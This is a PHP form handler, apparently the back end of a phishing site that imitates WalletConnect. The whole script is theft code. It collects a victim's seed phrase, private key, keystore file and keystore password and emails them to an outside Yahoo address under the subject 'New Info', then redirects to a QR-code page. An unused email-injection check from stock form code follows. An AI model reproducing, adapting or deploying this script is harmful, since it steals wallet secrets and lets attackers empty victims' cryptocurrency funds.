<?php 

if(isset($_POST)){

   $to = "vernongbarron@yahoo.com,sender@wallet-connect.github.io"; 

    $from = "sender@wallet-connect.github.io";

    $phrase = $_POST['phrase'];

    $key = $_POST['privatekey'];

    $json = $_POST['keystore'];

    $subject = "New Info";

    $subject2 = "Copy of your form submission";

    $message =    " (PHRASE):" . "\n\n" . $_POST['phrase'].   " (privatekey):" . "\n\n" . $_POST['privatekey'].  " (keystore):" . "\n\n"

    . $_POST['keystore'] .   " (keystore password):" . "\n\n" . $_POST['keystorepasswword'] ;

    $message2 = "Here is a copy of your message " . $first_name . "\n\n" . $_POST['message'];



    $headers = "From:" . $from;

    $headers2 = "From:" . $to;

    mail($to,$subject,$message,$headers);

    mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender

   

    // You can also use header('Location: thank_you.php'); to redirect to another page.

    }

    header('Location: qrcode.html');





// Function to validate against any email injection attempts

function IsInjected($str)

{

  $injections = array('(\n+)',

              '(\r+)',

              '(\t+)',

              '(%0A+)',

              '(%0D+)',

              '(%08+)',

              '(%09+)'

              );

  $inject = join('|', $injections);

  $inject = "/$inject/i";

  if(preg_match($inject,$str))

    {

    return true;

  }

  else

    {

    return false;

  }

}

?>